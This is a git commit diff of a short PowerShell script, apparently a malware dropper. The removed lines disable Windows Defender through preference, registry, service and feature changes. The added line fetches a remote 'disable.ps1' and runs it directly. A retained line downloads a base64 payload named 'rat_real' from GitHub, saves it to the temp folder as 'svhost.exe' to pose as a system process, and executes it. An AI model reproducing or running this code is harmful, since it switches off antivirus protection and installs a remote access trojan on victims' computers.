af0ed5ae852b317b7ef5f6cfba2fccdb2c999082
leetcodeuser123 <kingzers9851@gmail.com>
2024-07-15 09:57:52 -0700

    Update :3.ps1

--- :3.ps1
+++ :3.ps1
@@ -1,5 +1,2 @@
-Set-MpPreference -DisableRealtimeMonitoring $true
-New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
-Get-Service WinDefend | Stop-Service -PassThru | Set-Service -StartupType Disabled
-Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI
+iex (irm "https://github.com/leetcodeuser123/temp/raw/main/disable.ps1")
 $exePath = "$env:TEMP\svhost.exe"; [System.IO.File]::WriteAllBytes($exePath, [System.Convert]::FromBase64String((irm "https://github.com/leetcodeuser123/temp/raw/main/rat_real"))); & $exePath
